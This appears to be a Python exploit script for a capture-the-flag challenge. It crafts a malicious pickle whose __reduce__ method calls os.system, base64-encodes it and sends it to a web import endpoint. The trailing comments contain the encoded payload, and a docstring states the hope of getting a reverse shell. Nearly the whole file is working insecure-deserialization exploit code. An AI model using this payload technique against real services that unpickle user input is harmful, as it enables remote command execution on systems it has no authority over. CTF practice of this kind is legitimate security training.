import pickle
import requests
import base64
import os


def normal_usage(debug=True):
    '''
    this gets accepted by the import api
    '''
    url = 'http://ctf.adl.tw:12004/api/import'
    my_layout = [
        {'id': 'bocchi', 'left': 350, 'top': 180}
        
    ]
    my_layout=pickle.dumps(my_layout)
    my_layout=base64.b64encode(my_layout)
    my_layout=str(my_layout,'utf-8')
    print(my_layout)
    if debug:return
    myobj={'layout':my_layout}

    r = requests.post(url, json = myobj)
    
    return


class MyList(list):
    def __reduce__(self) :
        #_my_dict={'id': 'bocchi', 'left': 350, 'top': 180}
        #self.append(_my_dict)
        return os.system,('ipconfig',)
        

def payload(debug=True):
    '''
    hopefully this gets a reverse shell
    '''
    url = 'http://ctf.adl.tw:12004/api/import'
    _keys=['id', 'left', 'top']
    _values=['eye01', 350, 180]
    my_layout = MyList(zip(_keys,_values))
    #my_layout.append(_my_dict)

   
    my_layout=pickle.dumps(my_layout)
    my_layout=base64.b64encode(my_layout)
    my_layout=str(my_layout,'utf-8')
    print(my_layout)
    if debug:return



    myobj={'layout':my_layout}

    r = requests.post(url, json = myobj)
    pass
    return
payload()
#normal_usage()

#gASVIAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAhpcGNvbmZpZ5SFlFKULg==
#gASVIAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAhpcGNvbmZpZ5SFlFKULg==
#gASVIAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAhpcGNvbmZpZ5SFlFKULg==